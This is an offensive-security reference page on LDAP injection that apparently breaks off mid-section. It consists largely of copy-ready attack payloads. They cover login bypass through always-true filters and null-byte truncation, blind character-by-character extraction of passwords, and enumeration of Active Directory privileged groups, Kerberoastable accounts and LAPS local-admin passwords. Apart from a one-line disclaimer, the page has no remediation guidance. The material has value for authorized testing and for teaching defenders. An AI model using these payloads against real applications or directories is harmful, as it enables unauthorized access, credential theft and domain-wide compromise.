---
title: LDAP Injection Attack
description: Complete breakdown of LDAP Injection attack vectors, payload collections for authentication bypass, data extraction, blind enumeration, filter manipulation, and privilege escalation from directory services to domain-wide compromise.
navigation:
  icon: i-lucide-folder-tree
  title: LDAP Injection
---

## What is LDAP Injection?

LDAP Injection is an attack technique that exploits web applications that **construct LDAP queries from unsanitized user input**. The Lightweight Directory Access Protocol (LDAP) is widely used for querying and managing **directory services** — most commonly **Microsoft Active Directory**, **OpenLDAP**, and **Oracle Internet Directory**. When an application builds LDAP search filters by directly concatenating user-supplied data, an attacker can inject **special LDAP metacharacters and filter operators** to alter the query logic.

::callout
---
icon: i-lucide-triangle-alert
color: amber
---
LDAP Injection is uniquely dangerous because LDAP directories often contain the **crown jewels** of an organization — user accounts, passwords, group memberships, organizational structure, email addresses, phone numbers, and in Active Directory environments, the **keys to the entire enterprise**. A successful LDAP injection can lead to **full domain compromise**.
::

The vulnerability occurs when applications use **string concatenation** to build LDAP filters rather than using parameterized or properly escaped queries.

```text [Vulnerable LDAP Filter Construction]
# Application expects a simple username string:
user_input = "admin"

# Application builds LDAP filter via concatenation:
filter = "(&(uid=" + user_input + ")(userPassword=" + password + "))"

# Resulting LDAP filter (normal):
(&(uid=admin)(userPassword=secret123))

# Attacker injects LDAP metacharacters:
user_input = "admin)(&))"

# Resulting LDAP filter (injected):
(&(uid=admin)(&))(userPassword=anything))

# The (&) is always TRUE → Authentication bypassed
# Everything after the injected closing parenthesis is ignored
```

---

## LDAP Fundamentals for Injection

Understanding LDAP filter syntax is essential before crafting injection payloads.

::tabs
  :::tabs-item{icon="i-lucide-filter" label="LDAP Filter Syntax"}

  | Element | Syntax | Description |
  |---------|--------|-------------|
  | Equality | `(attribute=value)` | Exact match |
  | Presence | `(attribute=*)` | Attribute exists (any value) |
  | Greater/Equal | `(attribute>=value)` | Greater than or equal |
  | Less/Equal | `(attribute<=value)` | Less than or equal |
  | Substring | `(attribute=*val*)` | Contains substring |
  | Starts with | `(attribute=val*)` | Begins with |
  | Ends with | `(attribute=*val)` | Ends with |
  | AND | `(&(filter1)(filter2))` | Both conditions true |
  | OR | `(\|(filter1)(filter2))` | Either condition true |
  | NOT | `(!(filter))` | Negation |
  | Wildcard | `*` | Matches any value |

  ```text [Common LDAP Filters]
  # Find user by username
  (uid=admin)

  # Find user by email
  (mail=admin@target.com)

  # Authentication filter
  (&(uid=admin)(userPassword=secret))

  # Find all users
  (objectClass=person)

  # Find all groups
  (objectClass=groupOfNames)

  # Complex filter
  (&(objectClass=person)(|(uid=admin)(uid=root))(!(disabled=TRUE)))
  ```
  :::

  :::tabs-item{icon="i-lucide-network" label="LDAP Directory Structure"}

  ```text [Directory Information Tree (DIT)]
  dc=target,dc=com                          ← Root (Domain)
  ├── ou=People                             ← Organizational Unit
  │   ├── uid=admin                         ← User Entry
  │   │   ├── cn: System Administrator
  │   │   ├── mail: admin@target.com
  │   │   ├── userPassword: {SSHA}hash...
  │   │   ├── memberOf: cn=admins,ou=Groups
  │   │   └── employeeNumber: 001
  │   ├── uid=john
  │   │   ├── cn: John Doe
  │   │   ├── mail: john@target.com
  │   │   └── userPassword: {SSHA}hash...
  │   └── uid=jane
  │       ├── cn: Jane Smith
  │       └── mail: jane@target.com
  ├── ou=Groups
  │   ├── cn=admins
  │   │   └── member: uid=admin,ou=People,dc=target,dc=com
  │   ├── cn=developers
  │   └── cn=managers
  ├── ou=Services
  │   ├── cn=vpn
  │   └── cn=webmail
  └── ou=Computers
      ├── cn=DC01
      └── cn=FILESERVER01
  ```
  :::

  :::tabs-item{icon="i-lucide-bookmark" label="Common LDAP Attributes"}

  | Attribute | Description | Example |
  |-----------|-------------|---------|
  | `uid` | User ID / Login name | `admin` |
  | `cn` | Common Name | `John Doe` |
  | `sn` | Surname | `Doe` |
  | `givenName` | First name | `John` |
  | `mail` | Email address | `john@target.com` |
  | `userPassword` | Password (hashed) | `{SSHA}hash...` |
  | `telephoneNumber` | Phone number | `+1-555-0101` |
  | `description` | Description field | `System admin account` |
  | `memberOf` | Group membership | `cn=admins,ou=Groups,...` |
  | `objectClass` | Object type | `person`, `inetOrgPerson` |
  | `dn` | Distinguished Name | `uid=admin,ou=People,dc=target,dc=com` |
  | `employeeNumber` | Employee ID | `EMP001` |
  | `title` | Job title | `Senior Developer` |
  | `department` | Department | `Engineering` |
  | `manager` | Manager's DN | `uid=boss,ou=People,...` |

  **Active Directory Specific:**

  | Attribute | Description |
  |-----------|-------------|
  | `sAMAccountName` | Windows login name |
  | `userPrincipalName` | UPN (user@domain.com) |
  | `distinguishedName` | Full DN path |
  | `memberOf` | Group memberships |
  | `adminCount` | Admin indicator (1 = admin) |
  | `servicePrincipalName` | SPN for Kerberoasting |
  | `msDS-AllowedToDelegateTo` | Delegation targets |
  | `userAccountControl` | Account flags |
  | `lastLogon` | Last login timestamp |
  | `pwdLastSet` | Password last changed |
  | `lockoutTime` | Account lockout time |

  :::

  :::tabs-item{icon="i-lucide-alert-circle" label="Special Characters"}

  LDAP has specific metacharacters that must be escaped — and that attackers exploit.

  | Character | Hex Escape | Description |
  |-----------|-----------|-------------|
  | `*` | `\2a` | Wildcard — matches any value |
  | `(` | `\28` | Opening parenthesis — filter grouping |
  | `)` | `\29` | Closing parenthesis — filter grouping |
  | `\` | `\5c` | Escape character |
  | `NUL` | `\00` | Null byte — string terminator |
  | `/` | `\2f` | Forward slash |
  | `&` | N/A | AND operator (inside filter) |
  | `\|` | N/A | OR operator (inside filter) |
  | `!` | N/A | NOT operator (inside filter) |
  | `=` | N/A | Equality operator |
  | `>` | N/A | Greater-than (in `>=`) |
  | `<` | N/A | Less-than (in `<=`) |
  | `~` | N/A | Approximate match |

  :::
::

---

## Attack Flow & Methodology

::steps{level="3"}

### Step 1 — Identify LDAP-Backed Functionality

Map application features that likely query an LDAP directory.

```text [Common LDAP-Backed Features]
# Authentication
Login forms, Single Sign-On (SSO), VPN portals
Corporate email login, Intranet portals

# User / Contact Lookup
Employee directory, People search
Address book, Contact finder
"Find a colleague" features

# Authorization / Group Checks
Role-based access control checks
Group membership verification
Permission lookups

# Self-Service
Password reset / change
Profile update
Account recovery

# Administration
User management panels
Group management
Organizational unit browsers
```

### Step 2 — Detect LDAP Injection

Inject test payloads and observe application behavior changes.

| Test Payload | What to Observe |
|---|---|
| `*` | Returns all entries or different response |
| `)` | Error message or broken response |
| `)(` | Application error (unbalanced parentheses) |
| `*)(objectClass=*` | Returns data from broader scope |
| `\` | Error indicating LDAP backend |
| `admin)(uid=*))(` | Different response than normal login |
| `x]([!(objectClass=*` | LDAP error in response |
| `NUL` (`%00`) | Truncation or error |

### Step 3 — Determine Filter Structure

Understand how the application constructs the LDAP filter.

```text [Common Filter Patterns]
# Simple authentication
(&(uid=USER_INPUT)(userPassword=PASS_INPUT))

# With objectClass restriction
(&(objectClass=person)(uid=USER_INPUT)(userPassword=PASS_INPUT))

# Search by attribute
(cn=*USER_INPUT*)

# OR-based search
(|(uid=USER_INPUT)(mail=USER_INPUT)(cn=USER_INPUT))

# Active Directory authentication
(&(sAMAccountName=USER_INPUT)(userPassword=PASS_INPUT))
(&(objectCategory=person)(objectClass=user)(sAMAccountName=USER_INPUT))
```

### Step 4 — Exploit and Extract Data

Craft payloads based on the identified filter structure to bypass authentication, extract data, or enumerate the directory.

### Step 5 — Escalate Privileges

Use extracted credentials, group memberships, or service accounts for deeper access into the network.

::

---

## Authentication Bypass Payloads

::caution
All payloads are for **authorized security testing and educational purposes only**. Unauthorized access to computer systems is illegal.
::

### AND-Based Filter Bypass

When the application uses an AND filter like `(&(uid=INPUT)(userPassword=INPUT))`.

::code-group
```text [Always-True Injection]
# Inject into username field to make filter always true

# Payload: admin)(&))
# Filter becomes: (&(uid=admin)(&))(userPassword=anything))
# (&) = always true, rest is ignored
Username: admin)(&))
Password: anything

# Payload: admin)(|(uid=*))
# Filter becomes: (&(uid=admin)(|(uid=*)))(userPassword=anything))
Username: admin)(|(uid=*))
Password: anything

# Payload: *
# Filter becomes: (&(uid=*)(userPassword=anything))
# uid=* matches ALL users → returns first user
Username: *
Password: anything

# Payload: admin)(%26))
# URL-encoded & for AND operator
Username: admin)(%26))
Password: anything
```

```text [Comment-Out Password Check]
# Null byte to truncate the filter (terminate string)

# Payload: admin)%00
# Filter becomes: (&(uid=admin)\0)(userPassword=anything))
# Everything after null byte is ignored
Username: admin)%00
Password: anything

# Payload: admin)\00
Username: admin)\00
Password: anything

# Alternative null representations
Username: admin)&#x00;
Username: admin)\x00
Username: admin)%2500
```

```text [Wildcard Username + True Password]
# Match any user with always-true password condition

# Payload in password field:
Username: admin
Password: *)(&

# Filter: (&(uid=admin)(userPassword=*)(&)))
# userPassword=* matches any password

# Or both fields:
Username: *
Password: *

# Filter: (&(uid=*)(userPassword=*))
# Matches any user with any password → returns first entry
```

```text [Specific User Bypass]
# Target a specific admin account

Username: admin)(uid=admin))(&)(|
Password: anything

Username: admin)(!(&(1=0))
Password: anything

Username: administrator)(uid=*)
Password: anything

Username: admin)(|(password=*))
Password: anything

# With objectClass
Username: admin)(objectClass=*))(&)(|
Password: anything

Username: admin)(objectClass=person))(&)(|
Password: anything
```
::

### OR-Based Filter Bypass

When the application uses an OR filter like `(|(uid=INPUT)(mail=INPUT))`.

::code-group
```text [OR Filter Injection]
# Application filter: (|(uid=INPUT)(mail=INPUT))

# Inject to match everything
Username: *)(uid=*))(|(uid=*
# Filter: (|(uid=*)(uid=*))(|(uid=*)(mail=anything))

# Inject to add always-true condition  
Username: *)(|(objectClass=*
# Filter: (|(uid=*)(|(objectClass=*)(mail=anything))
# objectClass=* matches everything

# Simple wildcard
Username: *
# Filter: (|(uid=*)(mail=*))
# Matches all users
```

```text [OR Filter — Specific Extraction]
# Inject to extract specific user data

Username: admin)(|(uid=admin
# Returns admin user data regardless of other conditions

Username: *)(uid=admin)(|(uid=admin
# Ensures admin is matched

# Extract users by department
Username: *)(department=Engineering)(|(uid=*
# Returns all Engineering department users
```
::

### Password Field Injection

::code-group
```text [Password Field — AND Filter]
# Application: (&(uid=admin)(userPassword=INPUT))

# Always-true password
Password: *)(&
# Filter: (&(uid=admin)(userPassword=*)(&)))

Password: *
# Filter: (&(uid=admin)(userPassword=*))

Password: *)(!(&(1=0
# Filter: (&(uid=admin)(userPassword=*)(!(&(1=0)))

Password: *)(uid=*))(|(uid=*
# Filter: (&(uid=admin)(userPassword=*)(uid=*))(|(uid=*)))
```

```text [Password Field — Null Byte Truncation]
# Null byte terminates the filter string

Password: anything%00
# Filter: (&(uid=admin)(userPassword=anything\0))
# Server processes up to null byte

Password: *)%00
# Filter: (&(uid=admin)(userPassword=*)\0))
```

```text [Password Field — Nested Filter]
Password: *))(&(objectClass=*
# Filter: (&(uid=admin)(userPassword=*))(&(objectClass=*)))
# First filter matches, second is always true

Password: *))%00
# Filter: (&(uid=admin)(userPassword=*))\0)
# Complete valid filter, rest truncated
```
::

### Active Directory Specific Bypass

::code-group
```text [AD — sAMAccountName Injection]
# Application: (&(sAMAccountName=INPUT)(userPassword=INPUT))

# Bypass using AD-specific attributes
Username: admin)(&))
Username: admin)(objectCategory=person))(&)(|
Username: *)(sAMAccountName=admin))(&)(|
Username: admin)(!(userAccountControl:1.2.840.113556.1.4.803:=2))
# ↑ Also checks account is not disabled

# Find domain admins
Username: *)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=com))(&)(|
```

```text [AD — userPrincipalName Injection]
# Application: (&(userPrincipalName=INPUT)(password=INPUT))

Username: admin@target.com)(&))
Username: *@target.com)(userPrincipalName=*))(&)(|
Username: admin@target.com)(objectClass=user))(&)(|
```

```text [AD — Complex Filter Bypass]
# Some AD apps use complex multi-attribute filters:
# (&(objectCategory=person)(objectClass=user)(sAMAccountName=INPUT))

Username: admin)(objectClass=*))(&)(objectCategory=person)(objectClass=user)(sAMAccountName=admin
# Attempts to close and reconstruct valid filter

Username: *))(&(objectCategory=person)(objectClass=user)(sAMAccountName=*
# Closes original, opens new matching filter
```
::

---

## Data Extraction Payloads

### Attribute Extraction via OR Injection

::code-group
```text [Extract User Attributes]
# If application returns user data when authentication succeeds,
# inject to control which attributes are revealed

# Return all users
Username: *
Password: *

# Return specific user with all attributes
Username: admin)(uid=admin
Password: *

# Filter by attribute value
# Find users with admin role
Username: *)(role=admin)(|(uid=*
Password: *

# Find users in specific group
Username: *)(memberOf=cn=admins,ou=Groups,dc=target,dc=com)(|(uid=*
Password: *

# Find users with specific title
Username: *)(title=*admin*)(|(uid=*
Password: *

# Find service accounts
Username: *)(objectClass=applicationProcess)(|(uid=*
Password: *
```

```text [Enumerate Group Memberships]
# Find all members of a group
Username: *)(memberOf=cn=Domain Admins,cn=Users,dc=target,dc=com)(|(uid=*
Username: *)(memberOf=cn=IT-Support,ou=Groups,dc=target,dc=com)(|(uid=*
Username: *)(memberOf=cn=VPN-Users,ou=Groups,dc=target,dc=com)(|(uid=*
Username: *)(memberOf=cn=Finance,ou=Groups,dc=target,dc=com)(|(uid=*

# Find all groups (if searching group objects)
Search: *)(objectClass=groupOfNames)(|(cn=*
Search: *)(objectClass=group)(|(cn=*
```

```text [Search by Organizational Unit]
# Find users in specific OU
Username: *)(ou=IT)(|(uid=*
Username: *)(ou=Finance)(|(uid=*
Username: *)(ou=Executive)(|(uid=*
Username: *)(department=Security)(|(uid=*
Username: *)(department=Human Resources)(|(uid=*
```
::

### Wildcard-Based Enumeration

::code-group
```text [Username Enumeration — Substring]
# Test if usernames starting with specific characters exist

# Starts with 'a'
Username: a*
# Starts with 'ad'
Username: ad*
# Starts with 'adm'
Username: adm*
# Starts with 'admi'
Username: admi*
# Full match
Username: admin

# Systematic enumeration
Username: a*
Username: b*
Username: c*
...
Username: z*

# Find usernames with patterns
Username: *admin*    # Contains "admin"
Username: *svc*      # Service accounts
Username: *test*     # Test accounts
Username: *backup*   # Backup accounts
Username: *service*  # Service accounts
Username: *sql*      # Database accounts
```

```text [Email Enumeration]
# Via search/directory lookup functionality

Search: *@target.com
Search: admin@*
Search: *@internal.target.com
Search: ceo@*
Search: cfo@*
Search: cto@*

# Specific department emails
Search: *@engineering.target.com
Search: *@finance.target.com
Search: *@hr.target.com
```

```text [Phone Number / Employee ID Enumeration]
# Via people search functionality

Search: *555*       # Phone numbers containing 555
Search: EMP*        # Employee IDs starting with EMP
Search: *001*       # Low employee numbers (early employees, executives)
```
::

---

## Blind LDAP Injection

When the application **does not return LDAP data directly** but provides different responses based on whether the query matches.

::tabs
  :::tabs-item{icon="i-lucide-toggle-left" label="Boolean-Based Blind"}

  ::code-group
  ```text [Attribute Value Extraction — Character by Character]
  # Determine if admin's password starts with specific characters
  # Application filter: (&(uid=INPUT)(userPassword=INPUT))

  # Test first character
  Username: admin)(userPassword=a*))(&)(|    → Response A (match/no match)
  Username: admin)(userPassword=b*))(&)(|    → Response B
  Username: admin)(userPassword=c*))(&)(|    → Response B
  ...
  Username: admin)(userPassword=s*))(&)(|    → Response A (MATCH!)

  # First char is 's'. Test second character:
  Username: admin)(userPassword=sa*))(&)(|   → no match
  Username: admin)(userPassword=sb*))(&)(|   → no match
  ...
  Username: admin)(userPassword=se*))(&)(|   → MATCH!

  # Continue: se → sec → secr → secre → secret...
  ```

  ```text [Attribute Existence Check]
  # Test if specific attributes exist on a user

  # Does admin have a 'description' attribute?
  Username: admin)(description=*))(&)(|      → match = attribute exists

  # Does admin have 'telephoneNumber'?
  Username: admin)(telephoneNumber=*))(&)(|  → match = has phone number

  # Does admin have 'sshPublicKey'?
  Username: admin)(sshPublicKey=*))(&)(|     → match = has SSH key

  # Does admin have 'userCertificate'?
  Username: admin)(userCertificate=*))(&)(|  → match = has certificate

  # Test for sensitive AD attributes
  Username: admin)(adminCount=1))(&)(|       → match = is admin
  Username: admin)(servicePrincipalName=*))(&)(|  → match = has SPN (Kerberoastable)
  ```

  ```text [Group Membership Verification]
  # Is admin in Domain Admins?
  Username: admin)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=com))(&)(|
  # Different response = confirmed member

  # Is admin in specific group?
  Username: admin)(memberOf=cn=VPN-Access,ou=Groups,dc=target,dc=com))(&)(|
  Username: admin)(memberOf=cn=SSH-Access,ou=Groups,dc=target,dc=com))(&)(|
  Username: admin)(memberOf=cn=Database-Admins,ou=Groups,dc=target,dc=com))(&)(|
  ```

  ```text [Numeric Value Extraction]
  # Extract employeeNumber using comparison operators

  # Is employeeNumber >= 500?
  Username: admin)(employeeNumber>=500))(&)(|    → yes/no
  # Is employeeNumber >= 250?
  Username: admin)(employeeNumber>=250))(&)(|    → yes/no
  # Binary search narrows to exact value

  # Is uidNumber >= 1000?
  Username: admin)(uidNumber>=1000))(&)(|
  Username: admin)(uidNumber>=500))(&)(|
  Username: admin)(uidNumber>=750))(&)(|
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-clock" label="Time-Based Blind"}

  ::code-group
  ```text [Time-Based via Complex Queries]
  # LDAP itself doesn't have a SLEEP function
  # But we can create computationally expensive queries

  # Wildcard complexity — many wildcards cause slow processing
  Username: admin)(description=*a*b*c*d*e*f*g*h*i*j*))(&)(|
  # Complex wildcard matching is expensive

  # Large OR chains
  Username: admin)(|(uid=a*)(uid=b*)(uid=c*)(uid=d*)(uid=e*)(uid=f*)(uid=g*)(uid=h*)(uid=i*)(uid=j*)(uid=k*)(uid=l*)(uid=m*)(uid=n*)(uid=o*)(uid=p*)(uid=q*)(uid=r*)(uid=s*)(uid=t*)(uid=u*)(uid=v*)(uid=w*)(uid=x*)(uid=y*)(uid=z*)))(&)(|
  # Large filter processing takes measurably longer
  ```

  ```text [Response Size Timing]
  # Instead of true time delays, measure response size/time differences

  # Query that returns many results (slow):
  Username: *)(objectClass=*))(&)(|
  # Response time: ~500ms (large result set)

  # Query that returns no results (fast):
  Username: nonexistent12345)(objectClass=*))(&)(|
  # Response time: ~50ms (no results)

  # Use timing difference to extract data
  # If password starts with 'a' → slow (match found, data returned)
  # If password starts with 'b' → fast (no match, no data)
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-binary" label="Bit-by-Bit Extraction"}

  ::code-group
  ```text [Systematic Character Extraction]
  # Extract attribute values character by character using wildcards

  # Step 1: Determine value length
  admin)(description=?))(&)(|          → 1 char? (? = exactly one char)
  admin)(description=??))(&)(|         → 2 chars?
  admin)(description=???))(&)(|        → 3 chars?
  ...
  admin)(description=???????????????))(&)(| → 15 chars? MATCH!

  # Step 2: Extract each character position

  # Position 1:
  admin)(description=a*))(&)(|         → no
  admin)(description=b*))(&)(|         → no
  ...
  admin)(description=S*))(&)(|         → MATCH! First char = 'S'

  # Position 2:
  admin)(description=Sa*))(&)(|        → no
  admin)(description=Sb*))(&)(|        → no
  ...
  admin)(description=Sy*))(&)(|        → MATCH! Second char = 'y'

  # Position 3:
  admin)(description=Sys*))(&)(|       → MATCH! Third char = 's'

  # Continue: Syst → Syste → System → System  → System A → System Ad...
  # Final: "System Administrator"
  ```

  ```text [Character Class Narrowing (Faster)]
  # Binary search approach for character extraction

  # Is first char in A-M range?
  admin)(description=[A-M]*))(&)(|     → MATCH (char is in A-M)

  # Is first char in A-G range?
  admin)(description=[A-G]*))(&)(|     → MATCH (char is in A-G)

  # Is first char in A-D range?
  admin)(description=[A-D]*))(&)(|     → no (char is in E-G)

  # Is first char in E-F range?
  admin)(description=[E-F]*))(&)(|     → no (char is G)

  # Is first char G?
  admin)(description=G*))(&)(|         → MATCH! First char = 'G'

  # Note: Not all LDAP servers support character class ranges in filters
  # This works primarily with OpenLDAP
  ```
  ::
  :::
::

---

## Directory Enumeration Payloads

Comprehensive payloads for mapping the entire directory structure.

::accordion
  :::accordion-item{icon="i-lucide-users" label="User Enumeration"}

  ::code-group
  ```text [Enumerate All Users]
  # Via search/lookup functionality
  (objectClass=person)
  (objectClass=inetOrgPerson)
  (objectClass=organizationalPerson)
  (objectClass=user)                    # Active Directory
  (objectClass=posixAccount)            # POSIX/Linux
  (&(objectClass=user)(objectCategory=person))  # AD specific

  # Via injection
  Username: *)(objectClass=person))(&)(|
  Search: *)(objectClass=inetOrgPerson)(|(cn=*
  ```

  ```text [Enumerate by Attribute Patterns]
  # Find privileged accounts
  Username: *admin*
  Username: *root*
  Username: *service*
  Username: *svc_*
  Username: *backup*
  Username: *test*
  Username: *dev*
  Username: *staging*
  Username: *prod*
  Username: *api*
  Username: *bot*
  Username: *system*
  Username: *oracle*
  Username: *mysql*
  Username: *postgres*
  Username: *ldap*

  # Find accounts by naming convention
  Username: [a-z][a-z][0-9]*           # Initials + number (jd001)
  Username: *_admin
  Username: admin_*
  Username: sa_*                        # Service accounts
  Username: svc-*
  ```

  ```text [Enumerate Disabled Accounts]
  # OpenLDAP
  Username: *)(nsAccountLock=true)(|(uid=*
  Username: *)(pwdAccountLockedTime=*)(|(uid=*

  # Active Directory (userAccountControl flag 2 = disabled)
  Username: *)(userAccountControl:1.2.840.113556.1.4.803:=2)(|(sAMAccountName=*
  
  # Never-expire passwords (AD flag 65536)
  Username: *)(userAccountControl:1.2.840.113556.1.4.803:=65536)(|(sAMAccountName=*
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-shield" label="Group & Role Enumeration"}

  ::code-group
  ```text [Enumerate All Groups]
  # OpenLDAP
  Search: *)(objectClass=groupOfNames)(|(cn=*
  Search: *)(objectClass=groupOfUniqueNames)(|(cn=*
  Search: *)(objectClass=posixGroup)(|(cn=*

  # Active Directory
  Search: *)(objectClass=group)(|(cn=*
  Search: *)(objectCategory=group)(|(cn=*
  ```

  ```text [Enumerate Specific Group Members]
  # Domain Admins
  *)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=com)(|(uid=*

  # Enterprise Admins
  *)(memberOf=CN=Enterprise Admins,CN=Users,DC=target,DC=com)(|(uid=*

  # Schema Admins
  *)(memberOf=CN=Schema Admins,CN=Users,DC=target,DC=com)(|(uid=*

  # Account Operators
  *)(memberOf=CN=Account Operators,CN=Builtin,DC=target,DC=com)(|(uid=*

  # Backup Operators
  *)(memberOf=CN=Backup Operators,CN=Builtin,DC=target,DC=com)(|(uid=*

  # Remote Desktop Users
  *)(memberOf=CN=Remote Desktop Users,CN=Builtin,DC=target,DC=com)(|(uid=*

  # Custom groups
  *)(memberOf=cn=VPN-Access,ou=Groups,dc=target,dc=com)(|(uid=*
  *)(memberOf=cn=SSH-Admins,ou=Groups,dc=target,dc=com)(|(uid=*
  *)(memberOf=cn=Database-Access,ou=Groups,dc=target,dc=com)(|(uid=*
  ```

  ```text [Enumerate Admin Accounts (AD)]
  # adminCount = 1 (protected by AdminSDHolder)
  *)(adminCount=1)(|(sAMAccountName=*

  # Accounts with high privilege flags
  *)(userAccountControl:1.2.840.113556.1.4.803:=524288)(|(sAMAccountName=*
  # ↑ Trusted for delegation

  # Accounts with SPNs (Kerberoastable)
  *)(servicePrincipalName=*)(|(sAMAccountName=*
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-server" label="Infrastructure Enumeration"}

  ::code-group
  ```text [Enumerate Computers / Servers]
  # Active Directory
  *)(objectClass=computer)(|(cn=*
  *)(objectCategory=computer)(|(cn=*

  # Domain Controllers
  *)(userAccountControl:1.2.840.113556.1.4.803:=8192)(|(cn=*
  *)(primaryGroupID=516)(|(cn=*

  # Servers (not workstations)
  *)(operatingSystem=*Server*)(|(cn=*

  # By OS
  *)(operatingSystem=Windows Server 2022*)(|(cn=*
  *)(operatingSystem=Windows Server 2019*)(|(cn=*
  *)(operatingSystem=*Linux*)(|(cn=*
  ```

  ```text [Enumerate Organizational Units]
  *)(objectClass=organizationalUnit)(|(ou=*

  # Specific OUs
  *)(ou=IT)(objectClass=organizationalUnit)(|(ou=*
  *)(ou=Finance)(objectClass=organizationalUnit)(|(ou=*
  *)(ou=Servers)(objectClass=organizationalUnit)(|(ou=*
  *)(ou=Service Accounts)(objectClass=organizationalUnit)(|(ou=*
  ```

  ```text [Enumerate DNS / Network Info]
  # DNS zones (AD-integrated DNS)
  *)(objectClass=dnsZone)(|(dc=*
  *)(objectClass=dnsNode)(|(dc=*

  # Subnet objects
  *)(objectClass=subnet)(|(cn=*

  # Site objects
  *)(objectClass=site)(|(cn=*
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-key" label="Credential & Secret Extraction"}

  ::code-group
  ```text [Extract Password-Related Attributes]
  # Password hashes (if readable)
  *)(userPassword=*)(|(uid=*

  # NTLM hashes (AD — rarely exposed via LDAP)
  *)(unicodePwd=*)(|(sAMAccountName=*

  # Password policy attributes
  *)(pwdMinLength=*)(|(cn=*
  *)(pwdMaxAge=*)(|(cn=*
  *)(pwdInHistory=*)(|(cn=*
  *)(pwdLockoutDuration=*)(|(cn=*

  # Password last set
  *)(pwdLastSet>=0)(|(sAMAccountName=*

  # Never-changed passwords
  *)(pwdLastSet=0)(|(sAMAccountName=*
  ```

  ```text [Extract Sensitive Description Fields]
  # Users with descriptions (often contain passwords)
  *)(description=*password*)(|(uid=*
  *)(description=*pass:*)(|(uid=*
  *)(description=*pwd*)(|(uid=*
  *)(description=*secret*)(|(uid=*
  *)(description=*key*)(|(uid=*
  *)(description=*credential*)(|(uid=*
  *)(description=*temp*)(|(uid=*
  *)(description=*initial*)(|(uid=*
  *)(description=*default*)(|(uid=*

  # Extract info field
  *)(info=*)(|(uid=*
  *)(comment=*)(|(uid=*
  ```

  ```text [Extract SSH Keys / Certificates]
  # SSH public keys
  *)(sshPublicKey=*)(|(uid=*

  # Certificates
  *)(userCertificate=*)(|(uid=*
  *)(userSMIMECertificate=*)(|(uid=*

  # Kerberos keys (AD)
  *)(msDS-KeyCredentialLink=*)(|(sAMAccountName=*
  ```
  ::
  :::
::

---

## Server-Specific Injection Techniques

::tabs
  :::tabs-item{icon="i-lucide-database" label="OpenLDAP"}

  ::code-group
  ```text [OpenLDAP — Specific Payloads]
  # OpenLDAP specific objectClasses
  *)(objectClass=olcGlobal)(|(cn=*          # Config access
  *)(objectClass=olcDatabaseConfig)(|(cn=*  # Database config
  *)(objectClass=olcSchemaConfig)(|(cn=*    # Schema config

  # Access OpenLDAP monitor
  *)(objectClass=monitoredObject)(|(cn=*

  # Enumerate schema
  *)(objectClass=olcSchemaConfig)(|(cn=*

  # Password policy objects
  *)(objectClass=pwdPolicy)(|(cn=*

  # OpenLDAP overlay configs
  *)(objectClass=olcOverlayConfig)(|(cn=*

  # Access control entries
  *)(objectClass=olcAccessRule)(|(cn=*
  ```

  ```text [OpenLDAP — Extended Operations]
  # If application constructs extended LDAP operations:
  # Some OpenLDAP setups allow extop injection

  # Password modify extended operation
  # OID: 1.3.6.1.4.1.4203.1.11.1

  # Who Am I extended operation
  # OID: 1.3.6.1.4.1.4203.1.11.3
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-building" label="Active Directory"}

  ::code-group
  ```text [AD — LDAP Filter Injection]
  # Active Directory specific filters

  # Find all domain controllers
  *)(userAccountControl:1.2.840.113556.1.4.803:=8192)(|(cn=*

  # Find all disabled accounts
  *)(userAccountControl:1.2.840.113556.1.4.803:=2)(|(sAMAccountName=*

  # Find Kerberoastable accounts (accounts with SPNs)
  *)(servicePrincipalName=*)(!(sAMAccountName=krbtgt))(|(sAMAccountName=*

  # Find ASREProastable accounts (no pre-auth required)
  *)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(|(sAMAccountName=*

  # Find accounts trusted for delegation (unconstrained)
  *)(userAccountControl:1.2.840.113556.1.4.803:=524288)(|(sAMAccountName=*

  # Find accounts with constrained delegation
  *)(msDS-AllowedToDelegateTo=*)(|(sAMAccountName=*

  # Find accounts with RBCD configured
  *)(msDS-AllowedToActOnBehalfOfOtherIdentity=*)(|(sAMAccountName=*

  # Find users who can DCSync (Replicating Directory Changes)
  *)(adminCount=1)(|(sAMAccountName=*

  # Find LAPS managed computers (password readable)
  *)(ms-Mcs-AdmPwd=*)(|(cn=*
  *)(ms-Mcs-AdmPwdExpirationTime=*)(|(cn=*
  ```

  ```text [AD — Privileged Group Enumeration]
  # All high-privilege groups
  *)(memberOf=CN=Domain Admins,CN=Users,DC=TARGET,DC=COM)(|(sAMAccountName=*
  *)(memberOf=CN=Enterprise Admins,CN=Users,DC=TARGET,DC=COM)(|(sAMAccountName=*
  *)(memberOf=CN=Schema Admins,CN=Users,DC=TARGET,DC=COM)(|(sAMAccountName=*
  *)(memberOf=CN=Administrators,CN=Builtin,DC=TARGET,DC=COM)(|(sAMAccountName=*
  *)(memberOf=CN=Account Operators,CN=Builtin,DC=TARGET,DC=COM)(|(sAMAccountName=*
  *)(memberOf=CN=Server Operators,CN=Builtin,DC=TARGET,DC=COM)(|(sAMAccountName=*
  *)(memberOf=CN=Print Operators,CN=Builtin,DC=TARGET,DC=COM)(|(sAMAccountName=*
  *)(memberOf=CN=Backup Operators,CN=Builtin,DC=TARGET,DC=COM)(|(sAMAccountName=*
  *)(memberOf=CN=DnsAdmins,CN=Users,DC=TARGET,DC=COM)(|(sAMAccountName=*
  *)(memberOf=CN=Group Policy Creator Owners,CN=Users,DC=TARGET,DC=COM)(|(sAMAccountName=*
  ```

  ```text [AD — LAPS Password Extraction]
  # If LDAP injection returns attributes including LAPS passwords:

  # Find computers with LAPS
  *)(ms-Mcs-AdmPwd=*)(|(cn=*

  # LAPS password is stored in ms-Mcs-AdmPwd attribute
  # If the injected query returns this attribute → local admin password extracted!

  # Find LAPS expiry
  *)(ms-Mcs-AdmPwdExpirationTime=*)(|(cn=*
  ```

  ```text [AD — GPO and Policy Enumeration]
  # Group Policy Objects
  *)(objectClass=groupPolicyContainer)(|(displayName=*
  *)(objectClass=groupPolicyContainer)(|(cn=*

  # Organizational Units with linked GPOs
  *)(gPLink=*)(|(ou=*

  # Password policy
